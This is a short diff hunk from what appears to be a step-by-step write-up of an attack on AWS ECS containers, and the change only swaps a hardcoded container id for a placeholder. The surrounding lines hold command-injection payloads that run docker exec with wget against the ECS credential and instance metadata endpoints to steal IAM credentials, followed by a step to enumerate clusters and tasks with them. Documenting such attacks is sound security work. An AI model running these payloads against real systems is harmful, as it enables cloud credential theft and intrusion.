@@ -16,7 +16,7 @@
 
    `; docker exec <container id> sh -c 'wget -O- 169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI'`
    
-   `; docker exec ba301a00c81b sh -c 'wget -O- 169.254.169.254/latest/meta-data/iam/security-credentials/ecs-agent'`
+   `; docker exec <container id> sh -c 'wget -O- 169.254.169.254/latest/meta-data/iam/security-credentials/ecs-agent'`
 
 5. With the privd credentials list the clusters in the account then enumerate the tasks.
 
